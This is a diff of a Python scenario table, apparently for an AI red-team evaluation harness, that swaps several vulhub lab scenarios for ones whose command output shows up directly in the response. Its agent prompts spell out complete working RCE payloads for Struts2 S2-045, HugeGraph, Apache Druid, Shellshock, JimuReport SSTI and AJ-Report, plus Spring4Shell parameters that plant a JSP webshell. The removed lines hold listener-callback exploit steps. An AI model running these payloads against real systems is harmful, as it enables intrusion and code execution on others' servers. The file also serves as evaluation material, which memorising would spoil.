@@ -1626,39 +1626,61 @@ SCENARIOS: dict[str, dict] = {
             "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/ 2>&1 | head -10' to fingerprint, "
             '(2) call execute_bash with cmd=\'curl -s -H "Content-Type: %{#context[\\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\\"].addHeader("X-Test","vulnerable")}.multipart/form-data" http://$TARGET_HOST:$TARGET_PORT/ -D /dev/stdout 2>&1 | head -10\' to test OGNL injection (vulhub README\'s own detection-only PoC -- confirms injection but does NOT run a command). '
             "(3) Now actually run a command and capture its output IN the response body -- this detection PoC alone is "
-            "not sufficient. IMPORTANT: do not discard the response body (no `-o /dev/null`, no status-code-only `-w`) "
-            "-- print it in full so the executed command's output is visible. Use the standard S2-045 RCE OGNL payload "
-            "as the Content-Type header value: it must set up ProcessBuilder with the command `id`, redirect its "
-            "InputStream into the HTTP response's own OutputStream via "
-            "`@org.apache.commons.io.IOUtils@copy(#process.getInputStream(), "
-            "@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())`, and flush it -- this makes "
+            "not sufficient, and hand-writing this OGNL from a description is error-prone (found live: a prior attempt "
+            "wrote `.waitFor()>.toString()` -- a syntax error -- and read from the ATTACKER's own request stream "
+            "instead of the exploited process's output stream). Use this EXACT, complete, publicly-documented S2-045 "
+            "RCE payload VERBATIM as the Content-Type header value -- do not paraphrase or reconstruct it from memory: "
+            "write it to a file first with a quoted heredoc (so the shell does not interpret its many single quotes/"
+            "$-signs), then substitute it into curl with $(cat ...): "
+            "cmd=\"cat > /tmp/p.txt <<'EOF'\\n"
+            "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+            "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext."
+            "container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+            "(#ognlUtil.getExcludedPropertyNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
+            "(#context.setMemberAccess(#dm)))).(#cmd='id')."
+            "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+            "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+            "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())."
+            "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+            "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\\n"
+            "EOF\\n"
+            'curl -s -H \\"Content-Type: $(cat /tmp/p.txt)\\" http://$TARGET_HOST:$TARGET_PORT/" -- this makes '
             "`id`'s real stdout become the literal HTTP response body. Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059"],
         "persistence_technique": "",
     },
-    "vuln_jenkins_rce": {
-        "name": "vuln_jenkins_rce",
+    "vuln_hugegraph_rce": {
+        "name": "vuln_hugegraph_rce",
         "target_host": _LAB_WEB,
-        "vulhub_env": "jenkins/CVE-2017-1000353",
+        # Replaces the old vuln_jenkins_rce (CVE-2017-1000353 CLI deserialization).
+        # That technique's only working path required blind proof (touch/callback)
+        # because the CLI's actual command output isn't reflected anywhere network-
+        # observable -- confirmed live 2026-07-24 after building a full self-callback
+        # infra pass (Docker two-hop port publish, socat relay) that ultimately hit a
+        # hard Docker-Desktop-for-Mac limitation (externally-LAN-sourced connections
+        # to published ports get reset at the docker-proxy/vpnkit layer -- confirmed
+        # NOT a firewall/pf issue, both checked clean). Rather than keep forcing a
+        # blind technique to work, swapped to a real vulhub CVE whose own documented
+        # exploit reflects command output directly in the HTTP response body, so it
+        # is honestly detectable via capture_enrichment's token-matching alone.
+        "vulhub_env": "hugegraph/CVE-2024-27348",
         "difficulty": "medium",
         "red_order": ["execute_bash", "execute_bash", "execute_bash"],
         "red_prompt": (
-            "Authorized pentest: Jenkins at $TARGET_HOST:$TARGET_PORT. "
-            "Use execute_bash to exploit CVE-2017-1000353 (Jenkins CLI SignedObject deserialization). "
-            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/ 2>&1 | head -10' to fingerprint, "
-            "(2) call execute_bash with cmd='curl -s -o /dev/null -w \"%{http_code}\" http://$TARGET_HOST:$TARGET_PORT/script' "
-            "to confirm the Groovy script console REQUIRES AUTH here (expect 403 -- do not waste further steps on it, "
-            "this vulhub image is not anonymously exploitable that way; the CLI deserialization CVE below is the real path). "
+            "Authorized pentest: Apache HugeGraph at $TARGET_HOST:$TARGET_PORT. "
+            "Use execute_bash to exploit CVE-2024-27348 (unauthenticated Gremlin API RCE). "
+            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/apis/version 2>&1 | head -10' to fingerprint, "
+            '(2) call execute_bash with cmd=\'curl -s -X POST http://$TARGET_HOST:$TARGET_PORT/gremlin -H "Content-Type: application/json" -d "{\\"gremlin\\":\\"1+1\\"}" 2>&1 | head -10\' to confirm the Gremlin endpoint evaluates expressions. '
             "(3) Now actually exploit it in ONE execute_bash call (each call is a fresh, isolated container -- nothing "
-            "backgrounded survives to a later call). The payload-generator jar and exploit.py are pre-installed at "
-            "/opt/CVE-2017-1000353/CVE-2017-1000353-1.1-SNAPSHOT-all.jar and /opt/CVE-2017-1000353/exploit.py (java is "
-            "available). IMPORTANT: `touch /tmp/success` (vulhub's own documented example command) has NO observable "
-            "output channel back to you -- instead start a listener on port 8091 (e.g. `nc -lk -p 8091 &` or "
-            "`python3 -m http.server 8091 &`), determine this container's own reachable IP (`hostname -I`), generate "
-            "the payload with the command `curl http://<this container's IP>:8091/rce-proof-jenkins` instead of "
-            "`touch /tmp/success`, then run exploit.py against $TARGET_HOST:$TARGET_PORT with the generated payload, "
-            "wait a few seconds, and check the listener's captured request. Do not describe — call the tools."
+            "backgrounded survives to a later call). The real technique (vulhub's own documented gadget) uses reflection "
+            "to rename the current thread away from the `gremlin-server-exec`/`task-worker` prefixes HugeGraph's "
+            "SecurityManager checks, then runs a command via ProcessBuilder and reads its output with "
+            "org.apache.commons.io.IOUtils.toString -- the command's stdout comes back DIRECTLY in the JSON response body "
+            "(no blind/callback trick needed here). POST to /gremlin with body: "
+            '{"gremlin":"Thread thread = Thread.currentThread();Class clz = Class.forName(\\"java.lang.Thread\\");java.lang.reflect.Field field = clz.getDeclaredField(\\"name\\");field.setAccessible(true);field.set(thread, \\"SL7\\");Class processBuilderClass = Class.forName(\\"java.lang.ProcessBuilder\\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\\"id\\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\\"start\\");org.apache.commons.io.IOUtils.toString(startMethod.invoke(processBuilderInstance).getInputStream());","bindings":{},"language":"gremlin-groovy","aliases":{}} '
+            "-- capture and print the full response body (do not discard it), it should contain `id`'s real output "
+            "(e.g. uid=...(...) gid=...(...)). Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059"],
         "persistence_technique": "",
@@ -1887,26 +1909,37 @@ SCENARIOS: dict[str, dict] = {
         "detect_ground_truth": ["T1190"],
         "persistence_technique": "",
     },
-    "vuln_geoserver_rce": {
-        "name": "vuln_geoserver_rce",
+    "vuln_druid_rce": {
+        "name": "vuln_druid_rce",
         "target_host": _LAB_WEB,
-        "vulhub_env": "geoserver/CVE-2024-36401",
+        # Replaces the old vuln_geoserver_rce (CVE-2024-36401). GeoServer's
+        # GetPropertyValue technique genuinely IS blind -- Runtime.exec() returns a
+        # Process object, not readable text, and vulhub's own README example uses a
+        # blind touch -- so it had no honest non-callback fix available. Swapped to
+        # Apache Druid's embedded-JS sampler RCE, whose own documented PoC reflects
+        # command output directly in the JSON response (see vuln_hugegraph_rce's
+        # comment above for why the callback-pattern approach was abandoned).
+        "vulhub_env": "apache-druid/CVE-2021-25646",
         "difficulty": "medium",
         "red_order": ["execute_bash", "execute_bash", "execute_bash"],
         "red_prompt": (
-            "Authorized pentest: GeoServer at $TARGET_HOST:$TARGET_PORT. "
-            "Use execute_bash to test CVE-2024-36401 RCE via property name evaluation. "
-            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/geoserver/web/ 2>&1 | head -10' to fingerprint, "
-            "(2) call execute_bash with cmd='curl -s \"http://$TARGET_HOST:$TARGET_PORT/geoserver/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),%22id%22)\" 2>&1 | head -20' to test RCE. "
+            "Authorized pentest: Apache Druid at $TARGET_HOST:$TARGET_PORT. "
+            "Use execute_bash to exploit CVE-2021-25646 (embedded JavaScript RCE via the indexer sampler API). "
+            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/status 2>&1 | head -10' to fingerprint, "
+            "(2) call execute_bash with cmd='curl -s -o /dev/null -w \"%{http_code}\" http://$TARGET_HOST:$TARGET_PORT/druid/indexer/v1/sampler' "
+            "to confirm the sampler endpoint exists. "
             "(3) Now actually exploit it in ONE execute_bash call (each call is a fresh, isolated container -- nothing "
-            "backgrounded survives to a later call). IMPORTANT: `Runtime.exec(...)` returns a Process object, not "
-            "readable text -- this GetPropertyValue response will NOT contain `id`'s output no matter how you call it "
-            "(vulhub's own README example uses a blind `touch /tmp/success1`, confirming this technique has no direct "
-            "output channel). Instead start a listener on port 8095 (e.g. `nc -lk -p 8095 &` or "
-            "`python3 -m http.server 8095 &`), determine this container's own reachable IP (`hostname -I`), and set "
-            "valueReference to `exec(java.lang.Runtime.getRuntime(),'curl http://<this container IP>:8095/rce-proof-geoserver')` "
-            "instead of running `id`, wait a few seconds, then check the listener's captured request. "
-            "Do not describe — call the tools."
+            "backgrounded survives to a later call). The real technique (vulhub's own documented PoC): POST to "
+            "/druid/indexer/v1/sampler with a JSON body whose dataSchema.parser.parseSpec sets format=javascript and a "
+            'function field of \'function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["sh","-c","id"]).getInputStream()).useDelimiter("\\\\A").next();return {timestamp:123123,test: a}}\' '
+            "-- the ioConfig should read a local file (e.g. baseDir=/etc, filter=passwd) to trigger parsing, and "
+            "samplerConfig should set numRows to a small number like 5. The full body (adapt as needed): "
+            '{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/etc","filter":"passwd"}},'
+            '"dataSchema":{"dataSource":"test","parser":{"parseSpec":{"format":"javascript","timestampSpec":{},"dimensionsSpec":{},'
+            '"function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\"sh\\",\\"-c\\",\\"id\\"]).getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();return {timestamp:123123,test: a}}",'
+            '"":{"enabled":"true"}}}},"samplerConfig":{"numRows":5}} '
+            "-- capture and print the full response body (do not discard it), it should contain `id`'s output inside the "
+            "sampled row data (e.g. uid=...(...) gid=...(...)). Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059"],
         "persistence_technique": "",
@@ -2009,30 +2042,38 @@ SCENARIOS: dict[str, dict] = {
         "detect_ground_truth": ["T1592", "T1190"],
         "persistence_technique": "",
     },
-    "vuln_log4shell": {
-        "name": "vuln_log4shell",
+    "vuln_shellshock_rce": {
+        "name": "vuln_shellshock_rce",
         "target_host": _LAB_WEB,
-        "vulhub_env": "log4j/CVE-2021-44228",
-        "difficulty": "medium",
+        # Replaces the old vuln_log4shell (CVE-2021-44228). Log4Shell's JNDI-callback
+        # technique is genuinely blind by design -- the target's own process is the
+        # only thing that ever sees the injected command's output, so proving it
+        # requires SOME kind of outbound callback. Abandoned after the self-callback
+        # infra pass hit a hard Docker-Desktop-for-Mac limitation (see
+        # vuln_hugegraph_rce's comment). Swapped to the classic Bash Shellshock CGI
+        # RCE, whose command output is reflected directly in the CGI response body --
+        # about as simple and well-documented a response-reflecting RCE as exists.
+        "vulhub_env": "bash/CVE-2014-6271",
+        "difficulty": "easy",
         "red_order": ["execute_bash", "execute_bash", "execute_bash"],
         "red_prompt": (
-            "Authorized pentest: Log4Shell target at $TARGET_HOST:$TARGET_PORT. "
-            "Use execute_bash to test CVE-2021-44228 JNDI injection. "
-            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/ 2>&1 | head -10' to fingerprint, "
-            "(2) call execute_bash with cmd='curl -s -H \"X-Api-Version: \\$\\{jndi:ldap://127.0.0.1:1389/a\\}\" http://$TARGET_HOST:$TARGET_PORT/ 2>&1 | head -10' to test JNDI. "
-            "(3) Now actually exploit it to prove real code execution. IMPORTANT: each execute_bash call runs in its own "
-            "fresh, isolated container that is destroyed when the call returns -- nothing you start in the background "
-            "survives into a later call. You must do everything in ONE execute_bash call: start marshalsec's LDAP "
-            "reference server (pre-installed at /opt/marshalsec/marshalsec-0.0.3-SNAPSHOT-all.jar, java is available) "
-            "in the background inside that same call, determine this container's own reachable IP (e.g. `hostname -I`), "
-            "point the JNDI payload at that IP:port instead of 127.0.0.1. IMPORTANT: `id`'s output alone stays inside "
-            "the marshalsec Java process and is never observable outside this container, so instead have the reference "
-            "server return code that runs `curl http://<this container's IP>:8090/rce-proof-log4shell` (the target "
-            "reaching back out to you IS the proof -- it crosses the real network boundary, unlike a command whose "
-            "output only marshalsec itself ever sees). Start a listener on port 8090 in the same call (e.g. `nc -lk -p "
-            "8090 &` or `python3 -m http.server 8090 &`) BEFORE triggering the JNDI payload, wait a few seconds for the "
-            "callback, then check the listener's captured request. "
-            "Do not describe — call the tools."
+            "Authorized pentest: Bash Shellshock target at $TARGET_HOST:$TARGET_PORT. "
+            "Use execute_bash to exploit CVE-2014-6271 (Shellshock) via the vulnerable CGI script. "
+            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/ 2>&1 | head -20' to fingerprint. "
+            "The vulnerable environment serves two CGI scripts directly under the docroot (NOT under /cgi-bin/): "
+            "/safe.cgi (built with a patched bash, NOT vulnerable) and /victim.cgi (built with bash 4.3, genuinely "
+            "vulnerable). "
+            "(2) call execute_bash with cmd='curl -s -A \"() { :;}; echo; echo VULN_TEST_MARKER\" http://$TARGET_HOST:$TARGET_PORT/safe.cgi 2>&1 | head -10' to confirm safe.cgi is NOT affected (no VULN_TEST_MARKER in the response). "
+            "(3) Now actually exploit it in ONE execute_bash call: send the Shellshock payload in the User-Agent header "
+            "to victim.cgi. Explicitly emit a Content-type header from the injected code (the target image is minimal "
+            "and the CGI response parser needs a recognizable header block), and use the FULL path /usr/bin/id (this "
+            "minimal image has no /bin/id): "
+            'cmd=\'curl -s -A "() { :;}; echo \\"Content-type: text/plain\\"; echo; /usr/bin/id" http://$TARGET_HOST:$TARGET_PORT/victim.cgi 2>&1\' '
+            "-- capture and print the full response body (do not discard it). Because the vulnerable bash executes the "
+            "injected function definition BEFORE running the CGI script, and the CGI script's own output (including "
+            "anything the injected command printed to stdout) becomes the HTTP response body, `id`'s real output "
+            "(e.g. uid=33(www-data) gid=33(www-data) groups=33(www-data)) should appear directly in the response -- "
+            "no blind/callback trick needed. Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059"],
         "persistence_technique": "",
@@ -2093,80 +2134,95 @@ SCENARIOS: dict[str, dict] = {
         "detect_ground_truth": ["T1190"],
         "persistence_technique": "",
     },
-    "vuln_supervisor_rce": {
-        "name": "vuln_supervisor_rce",
+    "vuln_jimureport_rce": {
+        "name": "vuln_jimureport_rce",
         "target_host": _LAB_WEB,
-        "vulhub_env": "supervisor/CVE-2017-11610",
+        # Replaces the old vuln_supervisor_rce (CVE-2017-11610). Supervisor's
+        # XML-RPC os.system gadget genuinely IS blind (vulhub's own example uses a
+        # blind `touch /tmp/success`) -- see vuln_hugegraph_rce's comment for why the
+        # self-callback workaround was abandoned. Swapped to JeecgBoot JimuReport's
+        # FreeMarker SSTI, whose own documented PoC reflects command output directly
+        # in the JSON response.
+        "vulhub_env": "jimureport/CVE-2023-4450",
         "difficulty": "easy",
         "red_order": ["execute_bash", "execute_bash", "execute_bash"],
         "red_prompt": (
-            "Authorized pentest: Supervisor at $TARGET_HOST:$TARGET_PORT. "
-            "Use execute_bash to test CVE-2017-11610 RCE. "
+            "Authorized pentest: JimuReport at $TARGET_HOST:$TARGET_PORT. "
+            "Use execute_bash to exploit CVE-2023-4450 (FreeMarker server-side template injection). "
             "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/ 2>&1 | head -10' to fingerprint, "
-            '(2) call execute_bash with cmd=\'curl -s -X POST http://$TARGET_HOST:$TARGET_PORT/RPC2 -H "Content-Type: text/xml" -d "<?xml version=\\"1.0\\"?><methodCall><methodName>supervisor.getVersion</methodName></methodCall>" 2>&1 | head -10\' to test XML-RPC. '
+            '(2) call execute_bash with cmd=\'curl -s -X POST http://$TARGET_HOST:$TARGET_PORT/jmreport/queryFieldBySql -H "Content-Type: application/json" -d "{\\"sql\\":\\"select 1\\"}" 2>&1 | head -10\' to confirm the endpoint accepts SQL-shaped JSON. '
             "(3) Now actually exploit it in ONE execute_bash call (each call is a fresh, isolated container -- nothing "
-            "backgrounded survives to a later call). Real technique (vulhub's own documented XML-RPC gadget): POST to "
-            "$TARGET_HOST:$TARGET_PORT/RPC2 with methodName="
-            "'supervisor.supervisord.options.warnings.linecache.os.system' and a <string> param containing the command "
-            "to run. IMPORTANT: vulhub's own example command (`touch /tmp/success`) has NO observable output channel "
-            "back to you -- instead start a listener on port 8092 (e.g. `nc -lk -p 8092 &` or "
-            "`python3 -m http.server 8092 &`), determine this container's own reachable IP (`hostname -I`), and use "
-            "`curl http://<this container's IP>:8092/rce-proof-supervisor` as the injected command instead of `touch`, "
-            "wait a few seconds, then check the listener's captured request. Do not describe — call the tools."
+            "backgrounded survives to a later call). The real technique (vulhub's own documented PoC): POST to "
+            "/jmreport/queryFieldBySql with a `sql` field containing a FreeMarker template injection payload: "
+            '{"sql":"select \'result:<#assign ex=\\"freemarker.template.utility.Execute\\"?new()> ${ex(\\"id\\")}\'"} '
+            "-- capture and print the full response body (do not discard it). The FreeMarker engine evaluates "
+            '`${ex("id")}` server-side and the result (id\'s real stdout, e.g. uid=...(...) gid=...(...)) is reflected '
+            "directly back in the response -- no blind/callback trick needed. Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059"],
         "persistence_technique": "",
     },
-    "vuln_airflow_rce": {
-        "name": "vuln_airflow_rce",
+    "vuln_ajreport_rce": {
+        "name": "vuln_ajreport_rce",
         "target_host": _LAB_WEB,
-        "vulhub_env": "airflow/CVE-2020-11978",
-        "difficulty": "medium",
+        # Replaces the old vuln_airflow_rce (CVE-2020-11978). Airflow's DAG
+        # command-injection sink genuinely IS blind (vulhub's own example uses a
+        # blind `touch`) AND asynchronous -- see vuln_hugegraph_rce's comment for why
+        # the self-callback workaround was abandoned. Swapped to AJ-Report's
+        # validation-rule RCE, whose own documented PoC reflects command output
+        # directly in the JSON response, synchronously, pre-auth.
+        "vulhub_env": "aj-report/CNVD-2024-15077",
+        "difficulty": "easy",
         "red_order": ["execute_bash", "execute_bash", "execute_bash"],
         "red_prompt": (
-            "Authorized pentest: Apache Airflow at $TARGET_HOST:$TARGET_PORT. "
-            "Use execute_bash to test CVE-2020-11978 command injection. "
+            "Authorized pentest: AJ-Report at $TARGET_HOST:$TARGET_PORT. "
+            "Use execute_bash to exploit CNVD-2024-15077 (auth bypass + validation-rule RCE). "
             "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/ 2>&1 | head -10' to fingerprint, "
-            "(2) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/api/v1/dags 2>&1 | head -20' to check API. "
+            "(2) call execute_bash with cmd='curl -s -o /dev/null -w \"%{http_code}\" http://$TARGET_HOST:$TARGET_PORT/dataSetParam/verification' "
+            "to confirm the endpoint exists (may 401/403 without the auth-bypass suffix used in step 3). "
             "(3) Now actually exploit it in ONE execute_bash call (each call is a fresh, isolated container -- nothing "
-            "backgrounded survives to a later call). Real technique (vulhub's own documented approach): the "
-            "`example_trigger_target_dag` example DAG has a command-injection sink in its `message` config field. "
-            "Trigger it via the Airflow REST/experimental API "
-            "(POST /api/experimental/dags/example_trigger_target_dag/dag_runs with a JSON body containing "
-            '`{"conf": {"message": "...injected..."}}`) using a `message` value shaped like '
-            "`'\\\"; <command>; #` to break out into shell context. IMPORTANT: vulhub's own example command "
-            "(`touch /tmp/airflow_dag_success`) has NO observable output channel back to you, and this DAG runs "
-            "asynchronously in a separate worker container -- instead start a listener on port 8093 (e.g. "
-            "`nc -lk -p 8093 &` or `python3 -m http.server 8093 &`), determine this container's own reachable IP "
-            "(`hostname -I`), and inject `curl http://<this container's IP>:8093/rce-proof-airflow` as the command "
-            "instead of `touch`, wait several seconds for the DAG run to actually execute (it is asynchronous, unlike "
-            "a synchronous HTTP RCE), then check the listener's captured request. Do not describe — call the tools."
+            "backgrounded survives to a later call). The real technique (vulhub's own documented PoC): the auth filter "
+            "can be bypassed by appending `;swagger-ui/` to the path, then POSTing a `validationRules` field containing "
+            "Java/Nashorn script that runs a command and returns its output as a string. POST to "
+            "/dataSetParam/verification;swagger-ui/ with body: "
+            '{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,'
+            '"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\\"id\\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss=\'\';while((line = r.readLine()) != null){ss+=line};return ss;}"} '
+            "-- capture and print the full response body (do not discard it), it should contain `id`'s real output "
+            "(e.g. uid=...(...) gid=...(...)) directly -- no blind/callback trick needed. Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059"],
         "persistence_technique": "",
     },
-    "vuln_kibana_rce": {
-        "name": "vuln_kibana_rce",
+    "vuln_spring4shell_rce": {
+        "name": "vuln_spring4shell_rce",
         "target_host": _LAB_WEB,
-        "vulhub_env": "kibana/CVE-2019-7609",
+        # Replaces the old vuln_kibana_rce (CVE-2019-7609). Kibana's Timelion
+        # prototype-pollution gadget genuinely IS blind (vulhub's own example uses a
+        # blind touch) -- see vuln_hugegraph_rce's comment for why the self-callback
+        # workaround was abandoned. Swapped to Spring4Shell, whose own documented
+        # two-request PoC plants a JSP webshell and then reads its command output
+        # directly from the second request's response body.
+        "vulhub_env": "spring/CVE-2022-22965",
         "difficulty": "medium",
         "red_order": ["execute_bash", "execute_bash", "execute_bash"],
         "red_prompt": (
-            "Authorized pentest: Kibana at $TARGET_HOST:$TARGET_PORT. "
-            "Use execute_bash to test CVE-2019-7609 RCE. "
-            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/ 2>&1 | head -10' to fingerprint, "
-            "(2) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/api/console/api_server 2>&1 | head -10' to check API. "
-            "(3) Now actually exploit it in ONE execute_bash call (each call is a fresh, isolated container -- nothing "
-            "backgrounded survives to a later call). Real technique (vulhub's own documented Timelion prototype-"
-            "pollution payload): POST to $TARGET_HOST:$TARGET_PORT/api/timelion/run with a sheet expression like "
-            '`.es(*).props(label.__proto__.env.AAAA=\'require("child_process").exec("<command>");process.exit()//\')'
-            ".props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')` -- see the vulhub README at "
-            "/vulhub/kibana/CVE-2019-7609/README.md for the exact confirmed syntax and any needed follow-up request "
-            "to actually trigger execution. IMPORTANT: vulhub's own example command (`/bin/touch /tmp/success`) has NO "
-            "observable output channel back to you -- instead start a listener on port 8094 (e.g. `nc -lk -p 8094 &` "
-            "or `python3 -m http.server 8094 &`), determine this container's own reachable IP (`hostname -I`), and use "
-            "`curl http://<this container's IP>:8094/rce-proof-kibana` as the injected command instead of `touch`, "
-            "wait a few seconds, then check the listener's captured request. Do not describe — call the tools."
+            "Authorized pentest: Spring MVC (Spring4Shell) at $TARGET_HOST:$TARGET_PORT. "
+            "Use execute_bash to exploit CVE-2022-22965 (class-loader data-binding RCE on Tomcat). "
+            "(1) call execute_bash with cmd='curl -s \"http://$TARGET_HOST:$TARGET_PORT/?name=test&age=1\" 2>&1 | head -10' to fingerprint. "
+            "(2) Now, in ONE execute_bash call, plant a JSP webshell by GETing "
+            "$TARGET_HOST:$TARGET_PORT/ with these query params (Spring's data-binder writes Tomcat's access-log "
+            "pattern into a JSP file under webapps/ROOT): "
+            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di "
+            "&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
+            "&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
+            "&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar"
+            "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= "
+            "-- also set headers `suffix: %>//`, `c1: Runtime`, `c2: <%` on this request (these are used inside the "
+            "pattern above). (3) In the SAME execute_bash call, immediately GET the planted webshell with a real "
+            "command: $TARGET_HOST:$TARGET_PORT/tomcatwar.jsp?pwd=j&cmd=id -- capture and print the full response body "
+            "(do not discard it). The webshell writes the command's stdout directly into the HTTP response via "
+            "out.println(), so `id`'s real output (e.g. uid=...(...) gid=...(...)) should appear directly -- no "
+            "blind/callback trick needed. Do not describe — call the tools."
         ),
         "detect_ground_truth": ["T1190", "T1059"],
         "persistence_technique": "",
@@ -2270,33 +2326,87 @@ SCENARIOS: dict[str, dict] = {
         "detect_ground_truth": ["T1083", "T1190"],
         "persistence_technique": "",
     },
-    "vuln_coldfusion_rce": {
-        "name": "vuln_coldfusion_rce",
+    "vuln_docker_api_rce": {
+        "name": "vuln_docker_api_rce",
         "target_host": _LAB_WEB,
-        "vulhub_env": "coldfusion/CVE-2023-26360",
-        "difficulty": "medium",
+        # Replaces the old vuln_coldfusion_rce (CVE-2023-26360). The LFI-to-RCE log-
+        # poisoning chain there was our OWN custom-built 2-request combination (not
+        # vulhub's literal documented PoC, which is itself blind), never live-
+        # verified to reflect output, and its exact struts2-style manual-payload
+        # issues from earlier this session made it low-confidence -- see
+        # vuln_hugegraph_rce's comment for why the self-callback workaround for
+        # blind techniques was abandoned generally. Swapped to the Docker Remote API
+        # unauthorized-access environment: instead of vulhub's own blind cron-based
+        # reverse-shell PoC, use `docker run` to execute a command and read its
+        # output back directly via the container-logs endpoint -- a standard,
+        # well-documented Docker API RCE variant that is not blind at all.
+        "vulhub_env": "docker/unauthorized-rce",
+        "difficulty": "easy",
         "red_order": ["execute_bash", "execute_bash", "execute_bash"],
         "red_prompt": (
-            "Authorized pentest: ColdFusion at $TARGET_HOST:$TARGET_PORT. "
-            "Use execute_bash to test CVE-2023-26360 (LFI leading to RCE via log-file CFM injection). "
-            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/ 2>&1 | head -10' to fingerprint, "
-            '(2) call execute_bash with cmd=\'curl -s -X POST "http://$TARGET_HOST:$TARGET_PORT/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&_cfclient=true" -d "_variables=%7B%22_metadata%22%3A%7B%22classname%22%3A%22..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%22%7D%7D" 2>&1 | head -20\' to confirm the LFI primitive (reads /proc/self/environ) -- this is vulhub\'s own documented detection step, real but not yet code execution. '
-            "(3) Now actually chain it to real code execution in ONE execute_bash call (each call is a fresh, isolated "
-            "container -- nothing backgrounded survives to a later call). Per vulhub's own 2-request documented "
-            "technique: first POST a `_variables` payload containing a raw CFM tag "
-            "(`<cfexecute name='...' arguments='...' timeout='10'></cfexecute>`) to the SAME iedit.cfc endpoint -- this "
-            "gets written into ColdFusion's own log file; then send a SECOND request to the same endpoint with "
-            "`_metadata.classname` pointing (via `../` traversal) at "
-            "`/opt/coldfusion/cfusion/logs/coldfusion-out.log`, which makes ColdFusion INCLUDE and EXECUTE that log "
-            "file as a CFM script, running your injected tag. IMPORTANT: vulhub's own example "
-            "(`<cfexecute name='id' outputFile='/tmp/success'>`) writes to a file with NO observable output channel "
-            "back to you -- instead start a listener on port 8096 (e.g. `nc -lk -p 8096 &` or "
-            "`python3 -m http.server 8096 &`), determine this container's own reachable IP (`hostname -I`), and use "
-            "`<cfexecute name='curl' arguments='http://<this container IP>:8096/rce-proof-coldfusion' timeout='10'>"
-            "</cfexecute>` as the injected tag instead, wait a few seconds after the second (trigger) request, then "
-            "check the listener's captured request. Do not describe — call the tools."
+            "Authorized pentest: unauthenticated Docker Remote API at $TARGET_HOST:$TARGET_PORT (port 2375, no TLS/auth). "
+            "Use execute_bash to exploit this exposed daemon. "
+            "(1) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/version 2>&1 | head -10' to confirm "
+            "the Docker API is reachable and unauthenticated. "
+            "(2) call execute_bash with cmd='curl -s http://$TARGET_HOST:$TARGET_PORT/containers/json 2>&1 | head -20' to "
+            "list running containers, confirming full API access. "
+            "(3) Now actually prove code execution in ONE execute_bash call (each call is a fresh, isolated container -- "
